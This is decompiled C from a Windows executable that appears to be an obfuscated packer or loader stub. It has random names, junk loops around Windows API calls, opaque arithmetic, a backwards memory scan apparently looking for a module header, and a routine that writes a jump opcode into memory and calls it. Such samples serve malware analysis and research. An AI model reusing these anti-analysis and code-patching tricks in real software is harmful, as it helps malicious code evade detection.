/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

double sub_4017D4(); // weak
void __stdcall fjxT__LOi_o__bze(unsigned int *, unsigned int);
void __stdcall esfvPXYO(char, bool);
void __fastcall XJEMTX_KMW_Wk__xgt(int, unsigned int, bool);
void __stdcall IPGoqcql(int, unsigned int);
void __stdcall __nyDUEswS_L_vnlplpbB(__int16, float);
// void __userpurge sqlTJX__iezceottnfknXU(unsigned int@<edi>, __int16, int);
void __stdcall itiLZFB_NYKH(unsigned __int8);
void __stdcall PUP_SR__nk(char, __int16 *);
int sub_403AC6();
int __stdcall sub_403C4F(int, int, int);
int __stdcall sub_403C7F(int, _DWORD *);
int __stdcall sub_403EC3(int, int, int);
// int __usercall sub_404075@<eax>(int@<ebp>, unsigned int@<edi>, unsigned int *@<esi>);
// unsigned int __usercall sub_40411A@<eax>(int a1@<ebp>, unsigned int a2@<edi>, LONG *a3@<esi>);
int sub_4041D5();
int sub_4042EB();
char **__stdcall sub_4043E8(int, int, void (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD), int);
int __stdcall sub_404551(int, int);
int sub_404A5C();
int sub_404DF2();
int sub_404F90();
int sub_405105();
int sub_40528E();
int sub_4053E4();
// int __userpurge sub_4057E6@<eax>(__int16@<ax>, unsigned __int16);
// int __userpurge sub_40586D@<eax>(char@<al>, unsigned __int8);
// int __userpurge sub_4058D0@<eax>(int@<edi>, int *@<esi>, _DWORD *, unsigned int *, _DWORD *, _DWORD *, _DWORD *, _DWORD *, _DWORD *, unsigned int *);
// int __userpurge start@<eax>(int@<ebx>, int);
// void __userpurge kfxr_ex__kbfj__(unsigned int@<edi>, int, unsigned int *);
// void *__cdecl memset(void *, int Val, size_t Size);
int __cdecl sub_40680C(char *, int, int, unsigned int);
// int __usercall sub_406CB6@<eax>(_DWORD *@<eax>);
void __fastcall VoOZMHYX_V(unsigned int, int, __int16, double *);
// void __userpurge JDZRizjr_hUWUGA_IAylml(unsigned int@<ecx>, unsigned int@<ebx>, unsigned __int8 *, char);

//-------------------------------------------------------------------------
// Data declarations

// extern BOOL (__stdcall *IsWindow)(HWND hWnd);
// extern HWND (__stdcall *GetWindow)(HWND hWnd, UINT uCmd);
// extern BOOL (__stdcall *EnableScrollBar)(HWND hWnd, UINT wSBflags, UINT wArrows);
// extern BOOL (__stdcall *CharToOemW)(LPCWSTR pSrc, LPSTR pDst);
// extern BOOL (__stdcall *SetWindowTextW)(HWND hWnd, LPCWSTR lpString);
// extern DWORD (__stdcall *CharLowerBuffW)(LPWSTR lpsz, DWORD cchLength);
// extern HDWP (__stdcall *DeferWindowPos)(HDWP hWinPosInfo, HWND hWnd, HWND hWndInsertAfter, int x, int y, int cx, int cy, UINT uFlags);
// extern HDC (__stdcall *BeginPaint)(HWND hWnd, LPPAINTSTRUCT lpPaint);
// extern BOOL (__stdcall *IntersectRect)(LPRECT lprcDst, const RECT *lprcSrc1, const RECT *lprcSrc2);
// extern BOOL (__stdcall *PostMessageW)(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
// extern BOOL (__stdcall *PathMakePrettyW)(LPWSTR pszPath);
// extern int (__stdcall *StrSpnA)(PCSTR psz, PCSTR pszSet);
// extern void (__stdcall __noreturn *ExitProcess)(UINT uExitCode);
// extern HRSRC (__stdcall *FindResourceExW)(HMODULE hModule, LPCWSTR lpType, LPCWSTR lpName, WORD wLanguage);
// extern LONG (__stdcall *InterlockedExchange)(volatile LONG *Target, LONG Value);
// extern DWORD (__stdcall *GetTempPathA)(DWORD nBufferLength, LPSTR lpBuffer);
// extern DWORD (__stdcall *GetCurrentProcessId)();
// extern DWORD (__stdcall *GetCurrentThreadId)();
// extern int (__stdcall *GetDateFormatW)(LCID Locale, DWORD dwFlags, const SYSTEMTIME *lpDate, LPCWSTR lpFormat, LPWSTR lpDateStr, int cchDate);
// extern LONG (__stdcall *InterlockedExchangeAdd)(volatile LONG *Addend, LONG Value);
// extern DWORD (__stdcall *GetLastError)();
// extern void (__stdcall *RaiseException)(DWORD dwExceptionCode, DWORD dwExceptionFlags, DWORD nNumberOfArguments, const ULONG_PTR *lpArguments);
// extern int (__cdecl *stricmp)(const char *String1, const char *String2);
// extern BOOL (__stdcall *GetOpenFileNameW)(LPOPENFILENAMEW);
// extern BOOL (__stdcall *GetSaveFileNameW)(LPOPENFILENAMEW);
// extern BOOL (__stdcall *GetTextMetricsW)(HDC hdc, LPTEXTMETRICW lptm);
// extern DWORD (__stdcall *GetLayout)(HDC hdc);
// extern BOOL (__stdcall *Polyline)(HDC hdc, const POINT *apt, int cpt);
// extern BOOL (__stdcall *PatBlt)(HDC hdc, int x, int y, int w, int h, DWORD rop);
// extern HBITMAP (__stdcall *CreateDiscardableBitmap)(HDC hdc, int cx, int cy);
// extern BOOL (__stdcall *RectInRegion)(HRGN hrgn, const RECT *lprect);
void ***off_407040 = &off_40703C; // weak
void ***off_407058 = &off_407054; // weak
int (**off_407080)[459] = &off_407068; // weak
int **off_407084 = &off_407074; // weak
int dword_407090 = 0; // weak
int dword_407094 = -8243; // weak
int dword_407098 = -12323; // weak
int dword_40709C = 15917; // weak
int dword_4070A0 = 11837; // weak
int *off_4070D4[4] = { &dword_407094, &dword_407098, &dword_40709C, &dword_4070A0 }; // weak
int dword_4070EC = 0; // weak
int dword_4070F0 = 0; // weak
int dword_4070F4 = 0; // weak
int dword_407100 = 0; // weak
int dword_407104 = 0; // weak
void *off_40711C = &unk_407108; // weak
_UNKNOWN unk_4071A4; // weak
int **off_4072D8 = &off_407110; // weak
LONG Target = 126223975; // idb
int dword_4072F0 = 88433765; // weak
int dword_4072F4 = 88561524; // weak
int dword_4072F8 = 0; // weak
double (*off_4072FC)() = &sub_4017D4; // weak
int dword_407300 = 106390533; // weak
int dword_407304 = 106193926; // weak
int dword_407308 = 6624267; // weak
int dword_40730C = 15080039; // weak
int (__stdcall *off_407310)(_DWORD, _DWORD, _DWORD) = &sub_403C4F; // weak
int dword_407314 = 489240; // weak
int dword_407318 = 108336920; // weak
int dword_40731C = 395032; // weak
int dword_407320 = 124082023; // weak
__int16 word_407340[130] =
{
  -31207,
  -27111,
  -23015,
  -18919,
  -14823,
  -10727,
  -6631,
  -2535,
  1561,
  5657,
  9753,
  13849,
  17945,
  22041,
  26137,
  30233,
  -31463,
  -31719,
  -29927,
  -30183,
  -30439,
  -30695,
  -28903,
  -29159,
  32025,
  31769,
  -31975,
  -32231,
  -32487,
  -32743,
  -30951,
  -31127,
  -31111,
  -31159,
  -31143,
  -31063,
  -31047,
  -31095,
  -31079,
  -30999,
  -30727,
  -30775,
  -30759,
  -31191,
  -31175,
  -31223,
  -31208,
  -31209,
  -31210,
  -31211,
  -31212,
  -31213,
  -31214,
  -31215,
  -31216,
  -31121,
  -31122,
  -31203,
  -31204,
  -31205,
  -31206,
  -31207,
  -27111,
  -23015,
  -18919,
  -14823,
  -10727,
  -6631,
  -2535,
  1561,
  5657,
  9753,
  13849,
  17945,
  22041,
  26137,
  30233,
  -31463,
  -31719,
  -29927,
  -30183,
  -30439,
  -30695,
  -28903,
  -29159,
  32025,
  31769,
  -31975,
  -32231,
  -32487,
  -32743,
  -30951,
  -31127,
  -31111,
  -31159,
  -31143,
  -31063,
  -31047,
  -31095,
  -31079,
  -30999,
  -30727,
  -30775,
  -30759,
  -31191,
  -31175,
  -31223,
  -31208,
  -31209,
  -31210,
  -31211,
  -31212,
  -31213,
  -31214,
  -31215,
  -31216,
  -31121,
  -31122,
  -31203,
  -31204,
  -31205,
  -31206,
  -27289,
  29976,
  16952,
  -31208,
  11465,
  24632,
  -6635,
  0
}; // weak
int dword_40749C = -4109; // weak
int dword_4074B8 = 3417353; // weak
__int16 word_4074BC = -296; // weak
__int16 word_4074C4 = 24678; // weak
int dword_4074CC = 488810; // weak
int dword_4074D0 = 489335; // weak
_UNKNOWN unk_4074D4; // weak
char byte_4074D7[] = { '\b' }; // weak
int dword_4074D8 = 271366; // weak
int dword_4074EC = 0; // weak
_UNKNOWN unk_4074F0; // weak
int dword_407514 = 0; // weak
_BYTE byte_407520[4] = { -112, 0, 0, 0 }; // weak
char String2[] = "KJDjkkIDiuoif"; // idb
char String1[] = "JUDkjkKDK"; // idb
int dword_407548 = 7894550; // weak
int dword_40754C = 3479004; // weak
int dword_407550 = 144131956; // weak
int dword_407554 = 1988494392; // weak
CHAR pszSet[3] = "ks"; // idb
CHAR psz[] = "sdjlksd"; // idb
int (__cdecl *off_407580)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = &sub_40680C; // weak
char *off_407584 = &byte_4037E7; // weak
_UNKNOWN unk_407638; // weak
_BYTE byte_407640[336] =
{
  0,
  0,
  0,
  0,
  56,
  73,
  56,
  99,
  104,
  32,
  99,
  71,
  80,
  57,
  87,
  79,
  32,
  53,
  68,
  102,
  72,
  99,
  32,
  116,
  32,
  32,
  77,
  56,
  69,
  103,
  88,
  80,
  114,
  111,
  101,
  32,
  55,
  48,
  109,
  53,
  117,
  0,
  122,
  112,
  0,
  84,
  118,
  108,
  71,
  32,
  121,
  65,
  99,
  115,
  85,
  0,
  51,
  87,
  79,
  113,
  0,
  106,
  104,
  101,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  109,
  57,
  66,
  65,
  0,
  120,
  90,
  98,
  68,
  32,
  83,
  54,
  0,
  78,
  32,
  102,
  56,
  49,
  0,
  46,
  52,
  55,
  49,
  111,
  55,
  95,
  73,
  72,
  106,
  103,
  73,
  48,
  83,
  82,
  51,
  55,
  109,
  69,
  32,
  69,
  103,
  52,
  111,
  116,
  49,
  73,
  0,
  115,
  121,
  119,
  117,
  122,
  0,
  54,
  49,
  104,
  84,
  99,
  0,
  0,
  88,
  122,
  51,
  97,
  46,
  0,
  46,
  32,
  0,
  0,
  83,
  117,
  79,
  57,
  80,
  79,
  54,
  51,
  32,
  53,
  49,
  115,
  112,
  54,
  120,
  50,
  57,
  0,
  52,
  76,
  57,
  32,
  32,
  44,
  32,
  32,
  56,
  0,
  51,
  32,
  54,
  63,
  44,
  121,
  0,
  108,
  105,
  103,
  32,
  0,
  32,
  83,
  117,
  76,
  52,
  0,
  98,
  121,
  118,
  80,
  53,
  107,
  67,
  0,
  119,
  109,
  57,
  90,
  89,
  97,
  113,
  75,
  109,
  0,
  55,
  113,
  103,
  119,
  116,
  113,
  44,
  111,
  53,
  119,
  97,
  0,
  57,
  109,
  106,
  86,
  0,
  50,
  45,
  32,
  50,
  32,
  53,
  119,
  57,
  32,
  52,
  55,
  121,
  32,
  108,
  0,
  51,
  81,
  70,
  32,
  0,
  0,
  89,
  97,
  120,
  50,
  44,
  52,
  55,
  48,
  110,
  79,
  71,
  32,
  119,
  81,
  48,
  65,
  99,
  57,
  0,
  104,
  0,
  0,
  111,
  0,
  54,
  84,
  32,
  57,
  50,
  122,
  56,
  51,
  32,
  109,
  51,
  87,
  55,
  107,
  32,
  53,
  83,
  117,
  79,
  0,
  83,
  82,
  81,
  115,
  44,
  51,
  69,
  73,
  72,
  0,
  51,
  32,
  0,
  0,
  63,
  122,
  0,
  90,
  98,
  0,
  32,
  32,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0
}; // weak
int dword_4081CA = 1049530; // weak
int dword_4081CE = 1052911; // weak
int dword_4081D2 = 1057190; // weak
int dword_4081D6 = 1051051; // weak
struct tagTEXTMETRICW tm =
{
  1079693,
  1052361,
  1067616,
  1075178,
  1054669,
  1065552,
  1071410,
  1065595,
  1075521,
  1066947,
  1049523,
  6575u,
  16u,
  18884u,
  16u,
  26u,
  53u,
  16u,
  0u,
  72u
}; // idb
int dword_408216 = 1072995; // weak
WCHAR sz = 16785u; // idb
int dword_408222 = 1069709; // weak
int dword_408226 = 1050324; // weak
int dword_40822A = 1058237; // weak
int dword_40822E = 1058162; // weak
int dword_408232 = 1057270; // weak
_UNKNOWN unk_408236; // weak
int dword_40823A = 1057285; // weak
int dword_40823E = 1059355; // weak
int dword_408242 = 1056694; // weak
int dword_40824A = 1052618; // weak
int dword_40824E = 1054626; // weak
int dword_408252 = 1064671; // weak
int dword_408256 = 1050633; // weak
int dword_40825A = 1064538; // weak
int dword_40825E = 1063598; // weak
int dword_408262 = 1059275; // weak
int dword_408266 = 1059416; // weak
int dword_40826A = 1052785; // weak
int dword_40826E = 1077912; // weak
int dword_408272 = 1076156; // weak
int dword_408276 = 1067704; // weak
int dword_40827A = 1053440; // weak
int dword_40827E = 1080610; // weak
CHAR pDst = '¿'; // idb
int dword_408286 = 1074955; // weak
int dword_40828E = 1059430; // weak
int dword_408292 = 1071830; // weak
int dword_408296 = 1068130; // weak
int dword_40829A = 1075610; // weak
int dword_40829E = 1051916; // weak
int dword_4082A2 = 1081173; // weak
int dword_4082A6 = 1075402; // weak
WCHAR DateStr = 10474u; // idb
int dword_4082AE = 1080000; // weak
int dword_4082B2 = 1079181; // weak
int dword_4082B6 = 1077097; // weak
int dword_4082BA = 1060225; // weak
int dword_4082BE = 1077475; // weak
int dword_4082C2 = 1057192; // weak
int dword_4082C6 = 1049289; // weak
int *off_4082F5[4] = { &dword_4081CA, &dword_4081CE, &dword_4081D2, &dword_4081D6 }; // weak
int *off_408301 = &dword_4081D6; // weak
void *off_408309 = (void *)0x4081DE; // weak
void *off_408311 = (void *)0x4081E6; // weak
void *off_408319 = (void *)0x4081EE; // weak
void *off_408325 = (void *)0x4081FA; // weak
void *off_40832D = (void *)0x408202; // weak
void *off_408331 = (void *)0x408206; // weak
void *off_408339 = (void *)0x40820E; // weak
int *off_408341[2] = { &dword_408216, &sz }; // weak
void *off_408361 = &unk_408236; // weak
int *off_408365[3] = { &dword_40823A, &dword_40823E, &dword_408242 }; // weak
int *off_408369[2] = { &dword_40823E, &dword_408242 }; // weak
void *off_408371 = &unk_408246; // weak
int *off_408375[14] =
{
  &dword_40824A,
  &dword_40824E,
  &dword_408252,
  &dword_408256,
  &dword_40825A,
  &dword_40825E,
  &dword_408262,
  &dword_408266,
  &dword_40826A,
  &dword_40826E,
  &dword_408272,
  &dword_408276,
  &dword_40827A,
  &dword_40827E
}; // weak
int *off_40837D[12] =
{
  &dword_408252,
  &dword_408256,
  &dword_40825A,
  &dword_40825E,
  &dword_408262,
  &dword_408266,
  &dword_40826A,
  &dword_40826E,
  &dword_408272,
  &dword_408276,
  &dword_40827A,
  &dword_40827E
}; // weak
int *off_408381[11] =
{
  &dword_408256,
  &dword_40825A,
  &dword_40825E,
  &dword_408262,
  &dword_408266,
  &dword_40826A,
  &dword_40826E,
  &dword_408272,
  &dword_408276,
  &dword_40827A,
  &dword_40827E
}; // weak
int *off_408385[10] =
{
  &dword_40825A,
  &dword_40825E,
  &dword_408262,
  &dword_408266,
  &dword_40826A,
  &dword_40826E,
  &dword_408272,
  &dword_408276,
  &dword_40827A,
  &dword_40827E
}; // weak
int *off_408389[9] =
{
  &dword_40825E,
  &dword_408262,
  &dword_408266,
  &dword_40826A,
  &dword_40826E,
  &dword_408272,
  &dword_408276,
  &dword_40827A,
  &dword_40827E
}; // weak
int *off_40838D[8] =
{
  &dword_408262,
  &dword_408266,
  &dword_40826A,
  &dword_40826E,
  &dword_408272,
  &dword_408276,
  &dword_40827A,
  &dword_40827E
}; // weak
int *off_408391[7] =
{
  &dword_408266,
  &dword_40826A,
  &dword_40826E,
  &dword_408272,
  &dword_408276,
  &dword_40827A,
  &dword_40827E
}; // weak
int *off_4083A1[3] = { &dword_408276, &dword_40827A, &dword_40827E }; // weak
char *off_4083AD[18] =
{
  &pDst,
  &dword_408286,
  &dword_40828A,
  &dword_40828E,
  &dword_408292,
  &dword_408296,
  &dword_40829A,
  &dword_40829E,
  &dword_4082A2,
  &dword_4082A6,
  &DateStr,
  &dword_4082AE,
  &dword_4082B2,
  &dword_4082B6,
  &dword_4082BA,
  &dword_4082BE,
  &dword_4082C2,
  &dword_4082C6
}; // weak
int *off_4083B1[17] =
{
  &dword_408286,
  &dword_40828A,
  &dword_40828E,
  &dword_408292,
  &dword_408296,
  &dword_40829A,
  &dword_40829E,
  &dword_4082A2,
  &dword_4082A6,
  &DateStr,
  &dword_4082AE,
  &dword_4082B2,
  &dword_4082B6,
  &dword_4082BA,
  &dword_4082BE,
  &dword_4082C2,
  &dword_4082C6
}; // weak
int *off_4083B5[16] =
{
  &dword_40828A,
  &dword_40828E,
  &dword_408292,
  &dword_408296,
  &dword_40829A,
  &dword_40829E,
  &dword_4082A2,
  &dword_4082A6,
  &DateStr,
  &dword_4082AE,
  &dword_4082B2,
  &dword_4082B6,
  &dword_4082BA,
  &dword_4082BE,
  &dword_4082C2,
  &dword_4082C6
}; // weak
int *off_4083B9[15] =
{
  &dword_40828E,
  &dword_408292,
  &dword_408296,
  &dword_40829A,
  &dword_40829E,
  &dword_4082A2,
  &dword_4082A6,
  &DateStr,
  &dword_4082AE,
  &dword_4082B2,
  &dword_4082B6,
  &dword_4082BA,
  &dword_4082BE,
  &dword_4082C2,
  &dword_4082C6
}; // weak
int *off_4083BD[14] =
{
  &dword_408292,
  &dword_408296,
  &dword_40829A,
  &dword_40829E,
  &dword_4082A2,
  &dword_4082A6,
  &DateStr,
  &dword_4082AE,
  &dword_4082B2,
  &dword_4082B6,
  &dword_4082BA,
  &dword_4082BE,
  &dword_4082C2,
  &dword_4082C6
}; // weak
int *off_4083C5[12] =
{
  &dword_40829A,
  &dword_40829E,
  &dword_4082A2,
  &dword_4082A6,
  &DateStr,
  &dword_4082AE,
  &dword_4082B2,
  &dword_4082B6,
  &dword_4082BA,
  &dword_4082BE,
  &dword_4082C2,
  &dword_4082C6
}; // weak
int *off_4083D5[8] =
{
  &DateStr,
  &dword_4082AE,
  &dword_4082B2,
  &dword_4082B6,
  &dword_4082BA,
  &dword_4082BE,
  &dword_4082C2,
  &dword_4082C6
}; // weak
int *off_4083DD[6] =
{
  &dword_4082B2,
  &dword_4082B6,
  &dword_4082BA,
  &dword_4082BE,
  &dword_4082C2,
  &dword_4082C6
}; // weak
int *off_4083E1[5] = { &dword_4082B6, &dword_4082BA, &dword_4082BE, &dword_4082C2, &dword_4082C6 }; // weak
int *off_4083E5[4] = { &dword_4082BA, &dword_4082BE, &dword_4082C2, &dword_4082C6 }; // weak
int *off_4083E9[3] = { &dword_4082BE, &dword_4082C2, &dword_4082C6 }; // weak
int *off_4083ED[2] = { &dword_4082C2, &dword_4082C6 }; // weak
CHAR Buffer[] = "YIC_QD5_HV"; // idb
CHAR aScw7Sw5u[] = "SCW7_SW5U"; // idb
WCHAR Type = 73u; // idb
WCHAR pSrc[] = L"Y7V05_I3"; // idb
WCHAR Name = 82u; // idb
WCHAR String = 87u; // idb


//----- (004017D4) --------------------------------------------------------
#error "4017F9: cannot convert to microcode (funcsize=16)"

//----- (004038A8) --------------------------------------------------------
void __stdcall fjxT__LOi_o__bze(unsigned int *a1, unsigned int a2)
{
  dword_408222 = *off_4083ED[0] | (unsigned __int16)dword_408222;
  dword_4082B2 = dword_408256 ^ (unsigned __int8)dword_4082B2;
  *off_4083A1[0] ^= (unsigned __int8)dword_40826A;
}
// 408222: using guessed type int dword_408222;
// 408256: using guessed type int dword_408256;
// 40826A: using guessed type int dword_40826A;
// 4082B2: using guessed type int dword_4082B2;
// 4083A1: using guessed type int *off_4083A1[3];
// 4083ED: using guessed type int *off_4083ED[2];

//----- (004038EB) --------------------------------------------------------
void __stdcall esfvPXYO(char a1, bool a2)
{
  unsigned int v2; // [esp+4h] [ebp-1Ch]

  dword_408262 |= *(_DWORD *)off_408311;
  dword_4081D2 = (unsigned __int16)(dword_4082C6 & dword_4081D2);
  tm.tmDescent += dword_40823E + (v2 < (unsigned int)off_408311);
}
// 40391A: variable 'v2' is possibly undefined
// 4081D2: using guessed type int dword_4081D2;
// 40823E: using guessed type int dword_40823E;
// 408262: using guessed type int dword_408262;
// 4082C6: using guessed type int dword_4082C6;
// 408311: using guessed type void *off_408311;

//----- (00403935) --------------------------------------------------------
void __fastcall XJEMTX_KMW_Wk__xgt(int a1, unsigned int a2, bool a3)
{
  unsigned int v3; // [esp+4h] [ebp-20h]

  tm.tmExternalLeading ^= dword_4082A2;
  dword_4082A6 ^= *off_4083BD[0];
  tm.tmDigitizedAspectX += dword_4081D6 + (a2 < v3);
}
// 403963: variable 'v3' is possibly undefined
// 4081D6: using guessed type int dword_4081D6;
// 4082A2: using guessed type int dword_4082A2;
// 4082A6: using guessed type int dword_4082A6;
// 4083BD: using guessed type int *off_4083BD[14];

//----- (0040397E) --------------------------------------------------------
void __stdcall IPGoqcql(int a1, unsigned int a2)
{
  dword_4082A2 ^= *(_DWORD *)off_408325;
  dword_408272 &= *off_4083C5[0];
  dword_40828E ^= *off_408369[0];
}
// 408272: using guessed type int dword_408272;
// 40828E: using guessed type int dword_40828E;
// 4082A2: using guessed type int dword_4082A2;
// 408325: using guessed type void *off_408325;
// 408369: using guessed type int *off_408369[2];
// 4083C5: using guessed type int *off_4083C5[12];

//----- (004039C4) --------------------------------------------------------
void __stdcall __nyDUEswS_L_vnlplpbB(__int16 a1, float a2)
{
  dword_4082BE |= *off_4083DD[0];
  dword_408266 &= *off_4083ED[0];
  *(_DWORD *)off_408325 += (unsigned __int8)dword_4082AE;
}
// 408266: using guessed type int dword_408266;
// 4082AE: using guessed type int dword_4082AE;
// 4082BE: using guessed type int dword_4082BE;
// 408325: using guessed type void *off_408325;
// 4083DD: using guessed type int *off_4083DD[6];
// 4083ED: using guessed type int *off_4083ED[2];

//----- (00403A05) --------------------------------------------------------
void __userpurge sqlTJX__iezceottnfknXU(unsigned int a1@<edi>, __int16 a2, int a3)
{
  *off_408389[0] += tm.tmDigitizedAspectY;
  *off_4083E9[0] = (__PAIR64__(*off_4083E9[0], a1) - __PAIR64__(dword_4082BA, tm.tmDescent)) >> 32;
  dword_40824A -= (unsigned __int8)dword_4082AE;
}
// 40824A: using guessed type int dword_40824A;
// 4082AE: using guessed type int dword_4082AE;
// 4082BA: using guessed type int dword_4082BA;
// 408389: using guessed type int *off_408389[9];
// 4083E9: using guessed type int *off_4083E9[3];

//----- (00403A46) --------------------------------------------------------
void __stdcall itiLZFB_NYKH(unsigned __int8 a1)
{
  *off_4083B5[0] += dword_4082BE;
  dword_408296 -= *off_408381[0];
  *(_DWORD *)off_408309 -= *(_DWORD *)&sz;
}
// 408296: using guessed type int dword_408296;
// 4082BE: using guessed type int dword_4082BE;
// 408309: using guessed type void *off_408309;
// 408381: using guessed type int *off_408381[11];
// 4083B5: using guessed type int *off_4083B5[16];

//----- (00403A82) --------------------------------------------------------
void __stdcall PUP_SR__nk(char a1, __int16 *a2)
{
  unsigned int v2; // [esp+4h] [ebp-20h]

  *off_408301 -= dword_4082A2;
  dword_408222 &= dword_40822E;
  dword_40828E = (__PAIR64__(dword_40828E, v2) - __PAIR64__((unsigned __int8)dword_408286, dword_40822E)) >> 32;
}
// 403ABA: variable 'v2' is possibly undefined
// 408222: using guessed type int dword_408222;
// 40822E: using guessed type int dword_40822E;
// 408286: using guessed type int dword_408286;
// 40828E: using guessed type int dword_40828E;
// 4082A2: using guessed type int dword_4082A2;
// 408301: using guessed type int *off_408301;

//----- (00403AC6) --------------------------------------------------------
int sub_403AC6()
{
  BOOL TextMetricsW; // eax
  int v1; // eax
  unsigned __int16 i; // ax
  int v4; // [esp+20h] [ebp-20h]
  unsigned int v5; // [esp+30h] [ebp-10h]
  _WORD *v6; // [esp+34h] [ebp-Ch] BYREF
  int v7; // [esp+38h] [ebp-8h]
  int v8; // [esp+3Ch] [ebp-4h]

  v7 = 4;
  TextMetricsW = 0;
  v5 = 0;
  do
  {
    if ( ++v5 == 29 )
      TextMetricsW = GetTextMetricsW((HDC)0x106E, &tm);
  }
  while ( v5 < 0x17 );
  v8 = TextMetricsW + 1;
  v1 = (TextMetricsW + 1) << v7;
  *off_4083E1[0] += DateStr;
  dword_408252 = dword_40825A + (unsigned __int8)dword_408252;
  v8 = v1 << v7 << v7 << v7;
  v7 = (int)**off_407040;
  v6 = (_WORD *)(*(_DWORD *)v7 & ~(v8 - 1));
  v7 = (int)&v6;
  for ( i = *v6 - 558; (i ^ 0x32F) != 23344; i = **(_WORD **)v7 - 558 )
  {
    *(_DWORD *)v7 -= v8;
    v4 *= 2;
  }
  return *(_DWORD *)v7;
}
// 403C2F: variable 'v4' is possibly undefined
// 407040: using guessed type void ***off_407040;
// 408252: using guessed type int dword_408252;
// 40825A: using guessed type int dword_40825A;
// 408262: using guessed type int dword_408262;
// 4083E1: using guessed type int *off_4083E1[5];

//----- (00403C4F) --------------------------------------------------------
int __stdcall sub_403C4F(int a1, int a2, int a3)
{
  dword_407094 = 7755638;
  dword_407098 = 9986422;
  dword_40709C = 4527159;
  dword_4070A0 = 15230823;
  return 8865380;
}
// 407094: using guessed type int dword_407094;
// 407098: using guessed type int dword_407098;
// 40709C: using guessed type int dword_40709C;
// 4070A0: using guessed type int dword_4070A0;

//----- (00403C7F) --------------------------------------------------------
int __stdcall sub_403C7F(int a1, _DWORD *a2)
{
  int v2; // ecx
  int v3; // eax
  int v4; // eax
  unsigned int i; // [esp+48h] [ebp-10h]

  for ( i = 0; i < 0x1B; ++i )
    ;
  v2 = dword_4070F0;
  *(_BYTE *)off_408361 &= 0x6Cu;
  if ( v2 == 1 || !**(_DWORD **)(a1 + 56) )
  {
    v4 = -4099;
  }
  else
  {
    v3 = *off_4072D8[2] + *(_DWORD *)(*(_DWORD *)(*off_4072D8[2] + 60) + *off_4072D8[2] + 40);
    if ( off_4072D8[16] )
    {
      *(_BYTE *)off_407310 = -23;
      dword_408232 += dword_40822A;
      *(_DWORD *)((char *)off_407310 + 1) = v3 + 9513 - (_DWORD)off_407310 - 9518;
      *a2 = off_407310(*off_4072D8[2], dword_4070F0, dword_4070F4);
    }
    dword_407100 = 0;
    dword_407104 = 0;
    v4 = -4100;
  }
  return (v4 ^ 0x352F) + 9518;
}
// 403CC0: conditional instruction was optimized away because %var_10.4<1Bu
// 4070F0: using guessed type int dword_4070F0;
// 4070F4: using guessed type int dword_4070F4;
// 407100: using guessed type int dword_407100;
// 407104: using guessed type int dword_407104;
// 4072D8: using guessed type int **off_4072D8;
// 407310: using guessed type int (__stdcall *off_407310)(_DWORD, _DWORD, _DWORD);
// 40822A: using guessed type int dword_40822A;
// 408232: using guessed type int dword_408232;
// 40823E: using guessed type int dword_40823E;
// 408266: using guessed type int dword_408266;
// 4082A2: using guessed type int dword_4082A2;
// 408361: using guessed type void *off_408361;

//----- (00403EC3) --------------------------------------------------------
int __stdcall sub_403EC3(int a1, int a2, int a3)
{
  int v3; // ecx
  int result; // eax
  int *v5; // esi
  int *v6; // esi
  int *v7; // eax
  int *v8; // esi
  unsigned __int16 v9; // [esp+0h] [ebp-4Ch]
  int v10; // [esp+Ch] [ebp-40h]
  int v11; // [esp+14h] [ebp-38h]
  __int16 v12; // [esp+1Ch] [ebp-30h]
  __int16 v13; // [esp+20h] [ebp-2Ch]
  HDC hdc; // [esp+24h] [ebp-28h]
  unsigned int v15; // [esp+3Ch] [ebp-10h]

  v3 = -4099;
  v15 = 0;
  do
  {
    if ( ++v15 == 27 )
      GetLayout(hdc);
  }
  while ( v15 < 0x15 );
  result = 33599503;
  do
  {
    v5 = off_4070D4[((_BYTE)v3 + 1) & 3];
    *v5 *= -8200 * v3;
    v6 = off_4070D4[((_BYTE)v3 - 1) & 3];
    *v6 ^= v3 | result;
    dword_407304 = a1;
    if ( v3 == -4547 )
    {
      dword_407308 = a2;
    }
    else if ( v3 == -4483 )
    {
      dword_40730C = a3;
    }
    v10 += v9;
    v13 += v12;
    v11 += v10;
    v3 = ((v3 ^ 0x352F) - 9517 + 9518) ^ 0x352F;
    v7 = off_4070D4[v3 & 3];
    *v7 += v3 ^ (-8196 * v3);
    result = -8197 * v3;
    v8 = off_4070D4[((_BYTE)v3 - 2) & 3];
    *v8 |= -8197 * v3;
  }
  while ( v3 != -4403 );
  return result;
}
// 403EF2: variable 'hdc' is possibly undefined
// 403F6F: variable 'v3' is possibly undefined
// 403FD4: variable 'v9' is possibly undefined
// 403FD9: variable 'v10' is possibly undefined
// 404009: variable 'v12' is possibly undefined
// 404009: variable 'v13' is possibly undefined
// 40401D: variable 'v11' is possibly undefined
// 4070D4: using guessed type int *off_4070D4[4];
// 407304: using guessed type int dword_407304;
// 407308: using guessed type int dword_407308;
// 40730C: using guessed type int dword_40730C;
// 408309: using guessed type void *off_408309;
// 408381: using guessed type int *off_408381[11];

//----- (00404075) --------------------------------------------------------
int __usercall sub_404075@<eax>(int a1@<ebp>, unsigned int a2@<edi>, unsigned int *a3@<esi>)
{
  unsigned int v3; // ecx
  int result; // eax

  do
  {
    *a3 = 1;
    if ( a2 != 1 )
    {
      do
      {
        v3 = *a3;
        if ( *a3 <= a2 )
        {
          if ( v3 )
          {
            dword_40823E = 0;
            do
            {
              if ( ++dword_40823E == 33 )
                GetOpenFileNameW(*(LPOPENFILENAMEW *)(a1 - 16));
            }
            while ( (unsigned int)dword_40823E < 0x14 );
            *a3 = a2 / 0x101 + v3 + 1;
          }
          else
          {
            *a3 = a2;
          }
        }
        else
        {
          *a3 = v3 - 1;
        }
      }
      while ( *a3 != a2 );
    }
    result = InterlockedExchangeAdd(&Target, 7734887) + 7734887;
  }
  while ( result != Target );
  return result;
}
// 4040E7: variable 'v3' is possibly undefined
